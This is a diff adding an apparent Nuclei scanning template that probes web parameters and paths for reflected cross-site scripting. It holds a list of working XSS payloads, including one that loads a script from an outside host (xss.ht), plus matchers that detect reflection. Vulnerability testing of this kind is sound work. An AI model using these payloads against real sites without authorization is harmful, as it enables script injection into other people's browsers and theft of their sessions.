@@ -1,0 +1,54 @@
+id: PARAM-PATH-XSS
+
+#USUAGE     $ echo "http://testphp.vulnweb.com/listproducts.php?cat=" | nuclei -t xss.yaml | awk '{print $6}'  #Single parameter URLs only
+#PATH xss also $ echo "https://brutelogic.com.br/xss.php/" | nuclei -t xss.yaml | awk '{print $6}'
+
+info:
+  name: Reflected Cross-Site Scripting (XSS)
+  author: 25
+  severity: high
+
+requests:
+  - method: GET
+    path:
+       - '{{BaseURL}}{{payload}}'
+
+    payloads:
+       payload: 
+             - '"></script><script/src=https://just25testing.xss.ht></script>'
+             - '"><script>confirm(25)</script>'
+             - '%22%3E%3Cimg%20src%3Dx%20onerror%3Dconfirm(25)%3E'
+             - '"><svg/onload=confirm(25)>'
+             - '"><body/onload=alert(25)>'
+             - '"><iframe/src=javascript:alert(25)>'
+             
+    stop-at-first-match: true
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "<script>confirm(25)</script>"
+        part: body
+        condition: or
+
+      - type: word
+        words:
+          - "<img src=x onerror=confirm(25)>"
+        part: body
+        condition: or
+
+      - type: word
+        words:
+          - '<svg/onload=confirm(25)>'
+        part: body
+        condition: or
+
+      - type: word
+        words:
+          - '<body/onload=alert(25)>'
+        part: body
+
+      - type: word
+        words:
+          - '<iframe/src=javascript:alert(25)>'
+        part: body
